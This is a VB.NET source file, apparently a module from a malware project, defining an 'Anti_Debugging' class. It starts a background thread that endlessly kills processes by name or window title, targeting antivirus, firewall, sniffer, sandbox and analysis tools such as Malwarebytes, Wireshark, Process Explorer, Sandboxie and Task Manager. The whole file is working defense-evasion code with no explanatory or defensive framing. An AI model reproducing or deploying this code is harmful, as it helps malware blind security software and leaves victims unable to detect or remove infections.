Imports System.Diagnostics
Namespace Antis
    Public Class Anti_Debugging
        Public Function Start()
            Dim thread As New Threading.Thread(Sub() Bypass(True))
            thread.IsBackground = True
            thread.Start()
            Return True
        End Function
        Public Function Bypass(x As Boolean)
            Dim ProcessName() As String = {"procexp", "SbieCtrl", "SpyTheSpy", "SpeedGear", "wireshark", "mbam", "apateDNS", "IPBlocker", "cports", "ProcessHacker", "KeyScrambler", "TiGeR-Firewall", "Tcpview", "xn5x", "smsniff", "exeinfoPE", "regshot", "RogueKiller", "NetSnifferCs", "taskmgr", "Reflector", "capsa", "NetworkMiner", "AdvancedProcessController", "ProcessLassoLauncher", "ProcessLasso", "SystemExplorer"}
            Dim Titles() As String = {"ApateDNS", "Malwarebytes Anti-Malware", "Malwarebytes Anti-Malware", "TCPEye", "SmartSniff", "Active Ports", "ProcessEye", "MKN TaskExplorer", "CurrPorts", "System Explorer", "DiamondCS Port Explorer", "VirusTotal", "Metascan Online", "Speed Gear", "The Wireshark Network Analyzer", "Sandboxie Control", "ApateDNS", ".NET Reflector"}
            Try
                Do While x = True
                    For Each PrName As String In ProcessName
                        Dim ProcessList() As Process = System.Diagnostics.Process.GetProcessesByName(PrName)
                        For Each proc As Process In ProcessList
                            proc.Kill()
                        Next
                    Next

                    For Each Title As String In Titles
                        For Each proc As Process In Process.GetProcesses
                            If proc.MainWindowTitle.Contains(Title) Then
                                proc.Kill()
                            End If
                        Next
                    Next
                Loop
            Catch ex As Exception
                Return ex.Message
            End Try
            Return ""
        End Function
    End Class

End Namespace